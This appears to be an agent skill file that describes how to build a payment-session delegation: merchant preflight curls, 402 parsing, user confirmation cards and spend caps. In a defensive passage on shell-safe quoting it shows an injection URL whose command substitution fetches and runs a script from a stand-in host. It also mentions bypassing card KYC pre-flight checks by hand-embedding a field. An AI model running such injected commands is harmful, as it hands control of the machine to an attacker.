---
name: form-session-delegation
description: Construct a delegation object for agent session creation. Covers preflight discovery, 402 response parsing, and delegation schema. Called by request-session, not directly by users.
user-invocable: false
allowed-tools:
  - "Bash(curl *)"
  - "Bash(kpass agent:session create *)"
---

# Form Session Delegation

Use this skill when you need to create an agent session in Passport and must construct the `delegation` object correctly. This skill is a helper -- it is called by the **`request-session`** skill, not triggered directly by the user.

## Goal

Produce a valid `delegation` draft and pass it to the session create command:

```bash
kpass agent:session create --delegation '<JSON>' --output json
```

## What the Delegation Means

The delegation is the policy the user is approving. It has 3 parts:

1. **`task`** -- descriptive only. A human-readable summary for approval review.
2. **`payment_policy`** -- enforced by Passport. Defines how the agent is allowed to spend.
3. **`execution_constraints`** -- optional. Per-protocol constraints enforced at execution time (e.g. `x402` endpoint scoping, or `card.enabled` to bind a session-bound scoped virtual card).

## Current Platform Contract

Sessions are **protocol-agnostic**. The settlement protocol (x402, paygate, tempo, or shopping checkout) is detected per request from the merchant's preflight response — the delegation does **not** carry a protocol field. A single approved session is fungible across paid-API and shopping flows; the same session can settle x402, paygate, or tempo without re-approval.

The authorization boundary is:

- **Budget currency** (`payment_policy.currency`) — the denomination the caps are expressed in; the backend defaults it to `USD`. Sessions are settlement-token-agnostic: the merchant dictates which token settles, the backend normalizes it into the budget currency for cap enforcement, and the session locks to the first settled asset automatically. There is NO `assets` allowlist field — do not send one.
- **Per-tx and total spend caps** (`max_amount_per_tx`, `max_total_amount`) — denominated in `payment_policy.currency` (default `USD`) after settlement-token normalization.
- **Single-asset lock** — once a session has settled in one asset, the backend rejects subsequent transactions in any other asset.
- **TTL** (`ttl_seconds`) — session lifetime.

Optional `execution_constraints` can narrow what the session can do (e.g. `x402.allowed_endpoints` restricts the session to specific paid-API endpoints). `execution_constraints.card.enabled = true` requests a **session-bound scoped virtual card** (issued at approval, spending limit = `max_total_amount`, multi-use until the limit is reached or it expires) — for merchants that take a card rather than x402/wallet transfer. Prefer creating this via `agent:session create --use-card` in the **`request-session`** skill, which also pre-flights card KYC and backend cards support; only hand-embed `card.enabled` in a raw delegation if you deliberately need to bypass those pre-flight checks.

Optional and advanced: the top-level `routing_enabled` / `routing_cost_cap_usd_micros` fields control **cross-chain settlement**. `routing_enabled` is an **override** — when omitted it inherits the server's routing config, which is **enabled** on the Kite multichain deployment, so the backend auto-bridges/swaps when the merchant's chain differs from where the funds sit (the agent need not set anything). Set `routing_enabled: false` to force a session to same-chain-only, and use `routing_cost_cap_usd_micros` to bound the bridge/swap cost. See Construction Rule 7 in `@references/delegation-schema.md`.

---

## Step 1: Preflight -- Discover Payment Requirements

Before constructing the delegation, do a preflight HTTP request to the merchant URL to discover what payment the service requires.

### Validate the URL Before Curling It — MANDATORY

The merchant URL may come from the user, a catalog entry, or other less-trusted content — treat it as untrusted input before making a real network request with it:

- **Scheme:** must be `https://`. Reject `http://`, `file://`, or any other scheme.
- **Host:** reject targets that resolve to loopback (`127.0.0.0/8`, `::1`), private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local addresses (`169.254.0.0/16`, including the `169.254.169.254` cloud metadata endpoint), and other non-public/reserved ranges.
- If the URL fails validation, stop and tell the user rather than curling it.

### Shell-Safe Value Substitution — MANDATORY

Scheme/host validation limits *where* the request can go; it does not stop shell metacharacters *inside* an otherwise-valid URL from being interpreted by the shell. **Never splice a dynamic value into a Bash command as bare text or inside double quotes** — double quotes still expand `$(...)`, backticks, and `$VAR`, so a URL like `https://api.example.com/?q=$(curl evil.sh|sh)` executes on substitution even quoted that way.

Instead, assign the value to a shell variable as a **single-quoted literal** — single quotes store the bytes inertly, so nothing inside is expanded, even when the variable is referenced later — then reference the variable in double quotes (to prevent word-splitting, not to add safety):

```bash
MERCHANT_URL='<paste the exact URL, single-quoted, unmodified>'
curl -s -w "\n%{http_code}" "$MERCHANT_URL"
```

If the value contains a single quote, escape each `'` as `'\''` (close the quote, insert an escaped literal quote, reopen the quote) before wrapping it — do not skip this for values from less-trusted sources (user-provided URLs, catalog entries, merchant response bodies). The same rule applies to the POST body below and to any other dynamic value (delegation JSON, poll URLs, approval URLs) substituted into a command anywhere in this skill family.

### How to Preflight

Use `curl` to send a request to the merchant URL. Many x402-enabled services return a `402 Payment Required` response with payment requirement details:

```bash
curl -s -w "\n%{http_code}" "$MERCHANT_URL"
```

Or for a POST endpoint:

```bash
BODY='<request body JSON, single-quoted, unmodified>'
curl -s -w "\n%{http_code}" -X POST "$MERCHANT_URL" -H "Content-Type: application/json" -d "$BODY"
```

The `-s` flag silences progress output. The `-w "\n%{http_code}"` appends the HTTP status code on a new line so you can distinguish the response body from the status.

### Parsing the 402 Response

**The 402 response structure varies by merchant. There is no standard schema.**

Look for fields indicating:
- **Required asset** (e.g., `USDC`, `PYUSD`)
- **Required amount** (e.g., `"1.00"`, `"0.50"`)
- **Accepted network / chain** (CAIP-2, e.g. `eip155:8453` for base, `solana:<…>` for solana)
- **Resource description** (what the payment is for)

Common patterns include:

```json
{"payment": {"accepts": [{"asset": "USDC", "amount": "1.00", "network": "eip155:8453"}]}}
```

```json
{"price": "0.50", "currency": "USDC", "description": "API call"}
```

```json
{"cost": {"amount": "2.00", "token": "USDC"}, "resource": "/v1/data"}
```

Field names vary: `payment.accepts[]`, `price`, `cost`, `amount`, `fee`, `required_payment` -- names are not standardized.

**Use your best judgment to extract the payment requirements.**

If the preflight returns a non-402 status (e.g., 200, 401, 403, 500), it may not be an x402-enabled endpoint, or it may require auth headers first. In that case:
- If 200: the resource may not require payment. Inform the user.
- If 401/403: the resource requires authentication, not payment. Different problem.
- If you cannot confidently parse the 402 response, **use conservative defaults** (`max_amount_per_tx: "1"`, `max_total_amount: "10"`) and note this in the confirmation card. The user will see the proposed parameters and can adjust before approving.

### What to Extract from the 402

From a successful 402 parse, you should know:
- The **asset** the merchant accepts (e.g., `USDC`, `pieUSD`)
- The **amount** per request (may be in atomic units — divide by 10^decimals for human-readable)
- The **host** and **path** of the endpoint (from the URL itself)
- The **HTTP method** used

These feed directly into the delegation fields.

### Display Cards

Render the formatted status cards verbatim after each successful step — the horizontal-rule format is what users scan to confirm what happened, and the eval grader matches on the exact strings inside them. Summarizing or rewording in plain text loses both signals.

After parsing the 402 response, display the Payment Requirements card before constructing the delegation — the user will see this card and the proposed-parameters card back-to-back, and the contrast is what lets them spot a misread price or wrong asset before they're asked to approve a session built on it:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 Payment Requirements Discovered

🏪 Merchant:   {merchant_host}
🌐 Endpoint:   {method} {merchant_url}
💰 Price:      {amount} {asset} per request
⛓️  Network:    {network}
📦 Resource:   {resource_description}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

| Placeholder | Source |
|---|---|
| `{merchant_host}` | The hostname from the merchant URL (e.g., `api.example.com`) |
| `{method}` | The HTTP method used in the preflight (e.g., `POST`) |
| `{merchant_url}` | The full merchant URL |
| `{amount}` | The human-readable amount per request from the 402 response. If the amount is in atomic units (e.g., `100000000000000000`), convert to human-readable by dividing by 10^decimals. |
| `{asset}` | The asset name or symbol from the 402 response (e.g., `USDC`, `pieUSD`) |
| `{network}` | The network/chain from the 402 response, CAIP-2 (e.g., `eip155:8453` for base, `solana:<…>` for solana) |
| `{resource_description}` | The resource description from the 402 response, or the URL path if not available |

If a field is not available from the 402 response, omit that line from the card rather than guessing — a hallucinated `{network}` or `{asset}` value in the card misleads the user about what they're approving.

---

## Step 2: Confirm Session Parameters with User

After discovering payment requirements, present the proposed session parameters and wait for explicit confirmation before creating the session. The next step (`agent:session create`) triggers a passkey approval flow the user has to interact with — burning that interaction on parameters they would have adjusted (smaller budget, longer TTL, different scope) is wasted friction, and the confirmation card is also their only chance to catch a misread 402 before the session is on-chain.

Display this card and wait for the user's response before proceeding:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 Proposed Session Parameters

🏪 Merchant:         {merchant_host}
📝 Task:             {task_summary}
💰 Per-tx limit:     {max_amount_per_tx} {asset}
💰 Total budget:     {max_total_amount} {asset}
⏰ Session duration: {ttl_human_readable}
🎯 Scope:            {scope_description}

Shall I proceed with creating this session?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

| Placeholder | Source |
|---|---|
| `{merchant_host}` | The hostname from the merchant URL |
| `{task_summary}` | The task summary you will put in the delegation (derived from user's request) |
| `{max_amount_per_tx}` | The per-tx limit (from 402 response or user) |
| `{max_total_amount}` | The total budget (calculated from per-tx * expected requests, or user-specified) |
| `{asset}` | The payment asset |
| `{ttl_human_readable}` | Human-readable duration (e.g., "1 hour", "24 hours") |
| `{scope_description}` | Either "Scoped to {host}{path}" or "Unscoped (any endpoint)" |

The user may:
- **Confirm** ("yes", "proceed", "looks good") → proceed to create the session
- **Adjust** ("make the budget 50", "change TTL to 2 hours") → update parameters and show the card again
- **Cancel** ("no", "cancel") → stop and inform the user

Only after the user explicitly confirms should you proceed to construct the delegation and call `agent:session create`.

---

## Step 3: Construct the Delegation

Build the delegation from these input sources:

1. **User goal** -- what the user asked to do (becomes `task.summary`)
2. **Preflight 402 response** -- payment requirements (becomes `payment_policy` fields). The protocol the merchant speaks (x402, paygate, tempo) is detected at execute time and does **not** go into the delegation.
3. **Endpoint scope** -- if the plan is stable, add execution constraints (e.g. `x402.allowed_endpoints` for paid-API sessions)

## Schema, Construction Rules, Examples, and Validation

The complete delegation schema, per-field construction rules (`task.summary`, `payment_policy.*`, `execution_constraints`), worked examples (x402 full + minimal, crossmint shopping), practical heuristics (Path A from 402 preflight, Path B from known amount), the validation checklist, and the "What Not To Do" anti-patterns all live in:

→ **`@references/delegation-schema.md`**

Read that file before constructing the delegation JSON. The schema, the validation checks, and the worked examples are all there; this SKILL.md only owns the orchestration (preflight → confirm → construct).

---

## Mental Model

The agent is doing 4 things:

1. **Discovering** payment requirements via preflight (curl the merchant) — Step 1 above.
2. **Summarizing** the user-authorized task — into `task.summary` per the schema.
3. **Compiling** the spend envelope from 402 data + user context — per the Construction Rules in `@references/delegation-schema.md`.
4. **Optionally declaring** enforceable execution scope — `execution_constraints.x402` when the endpoint plan is stable.

The delegation is not free-form text. It is a structured policy proposal for user approval and backend enforcement.
